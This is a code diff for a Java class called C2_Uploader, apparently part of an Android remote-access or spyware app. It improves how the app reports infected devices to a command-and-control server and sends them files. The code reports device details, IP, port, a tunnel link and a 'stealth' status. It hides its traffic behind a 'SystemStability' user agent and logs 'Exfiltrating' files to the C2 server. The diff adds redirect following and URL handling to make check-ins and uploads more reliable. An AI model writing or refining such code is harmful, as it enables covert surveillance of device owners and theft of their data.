@@ -26,21 +26,11 @@ public class C2_Uploader {
      * Gets a persistent, unique identifier for this device.
      */
     public static String getDeviceId(Context context) {
-        if (cachedDeviceId != null) return cachedDeviceId;
-        
-        String id = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                .getString("c2_device_id", null);
-        
-        if (id == null) {
-            // High-entropy combination of Android ID and a random UUID
-            String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
-            id = (androidId != null ? androidId : "") + "_" + UUID.randomUUID().toString().substring(0, 8);
-            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                    .edit().putString("c2_device_id", id).apply();
-        }
-        
-        cachedDeviceId = id;
-        return id;
+        return android.os.Build.MODEL != null ? android.os.Build.MODEL : "Android Device";
+    }
+
+    private static String getIpForRenderC2(Context context) {
+        return MainActivity.getBestIpForConnection(context);
     }
 
     /**
@@ -50,23 +40,34 @@ public class C2_Uploader {
         String c2Url = BuildConfig.WEBHOOK_URL;
         if (c2Url == null || c2Url.isEmpty()) return;
 
+        // Skip checkin for Google Apps Script webhooks (Google Sheets logging is handled by sendIpToWebhook)
+        if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return;
+
         new Thread(() -> {
             try {
-                String ip = MainActivity.getLocalIpAddress();
+                String ip = getIpForRenderC2(context);
                 int port = FirebaseConfig.DEFAULT_PORT;
                 
+                String devId = getDeviceId(context);
                 JSONObject status = new JSONObject();
-                status.put("deviceId", getDeviceId(context));
+                status.put("deviceId", devId);
+                status.put("brand", Build.MANUFACTURER);
                 status.put("type", "checkin");
                 status.put("model", Build.MODEL);
                 status.put("os", Build.VERSION.RELEASE);
                 status.put("battery", SystemAnalytics.getBatteryLevel(context) + "%");
                 status.put("ip", ip);
                 status.put("port", port);
-                status.put("link", "/tunnel?deviceId=" + getDeviceId(context));
+                status.put("link", "/tunnel?deviceId=" + devId);
                 status.put("stealth", SystemAnalytics.isStealthEnabled(context));
                 
-                postJsonSync(c2Url, status.toString());
+                String baseC2 = c2Url.trim();
+                while (baseC2.endsWith("/")) baseC2 = baseC2.substring(0, baseC2.length() - 1);
+                if (baseC2.endsWith("/checkin")) baseC2 = baseC2.substring(0, baseC2.length() - 8);
+                while (baseC2.endsWith("/")) baseC2 = baseC2.substring(0, baseC2.length() - 1);
+                
+                String checkinUrl = baseC2 + "/checkin/";
+                postJsonSync(checkinUrl, status.toString());
             } catch (Exception e) {
                 Log.e(TAG, "Check-in failed: " + e.getMessage());
             }
@@ -81,6 +82,7 @@ public class C2_Uploader {
         try {
             URL url = new URL(urlString);
             conn = (HttpURLConnection) url.openConnection();
+            conn.setInstanceFollowRedirects(false);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
             conn.setRequestProperty("User-Agent", "SystemStability/1.5");
@@ -94,9 +96,37 @@ public class C2_Uploader {
             }
 
             int code = conn.getResponseCode();
-            Log.d(TAG, "C2 JSON POST Response: " + code);
+            if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
+                String redirectUrl = conn.getHeaderField("Location");
+                if (redirectUrl != null && !redirectUrl.isEmpty()) {
+                    Log.d(TAG, "Following C2 Redirect to: " + redirectUrl);
+                    HttpURLConnection redirConn = (HttpURLConnection) new URL(redirectUrl).openConnection();
+                    redirConn.setRequestMethod("POST");
+                    redirConn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+                    redirConn.setRequestProperty("User-Agent", "SystemStability/1.5");
+                    redirConn.setConnectTimeout(15000);
+                    redirConn.setReadTimeout(15000);
+                    redirConn.setDoOutput(true);
+                    try (OutputStream os = redirConn.getOutputStream()) {
+                        byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
+                    }
+                    code = redirConn.getResponseCode();
+                }
+            }
+            Log.d(TAG, "C2 JSON POST Response Code: " + code + " to URL: " + urlString);
+            if (code >= 400) {
+                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8))) {
+                    StringBuilder responseBody = new StringBuilder();
+                    String responseLine;
+                    while ((responseLine = br.readLine()) != null) {
+                        responseBody.append(responseLine.trim());
+                    }
+                    Log.e(TAG, "C2 Server Error Response: " + responseBody.toString());
+                } catch (Exception ignored) {}
+            }
         } catch (Exception e) {
-            Log.e(TAG, "C2 POST Error: " + e.getMessage());
+            Log.e(TAG, "C2 POST Error: " + e.getMessage(), e);
         } finally {
             if (conn != null) conn.disconnect();
         }
@@ -132,7 +162,13 @@ public class C2_Uploader {
             try {
                 FirebaseConfig.logActivity("DATA_UPLINK: Exfiltrating " + file.getName() + " to C2...");
                 
-                URL url = new URL(webhookUrl);
+                String baseC2 = webhookUrl.trim();
+                while (baseC2.endsWith("/")) baseC2 = baseC2.substring(0, baseC2.length() - 1);
+                if (baseC2.endsWith("/upload")) baseC2 = baseC2.substring(0, baseC2.length() - 7);
+                while (baseC2.endsWith("/")) baseC2 = baseC2.substring(0, baseC2.length() - 1);
+
+                String uploadTargetUrl = baseC2 + "/upload";
+                URL url = new URL(uploadTargetUrl);
                 conn = (HttpURLConnection) url.openConnection();
                 conn.setDoInput(true);
                 conn.setDoOutput(true);
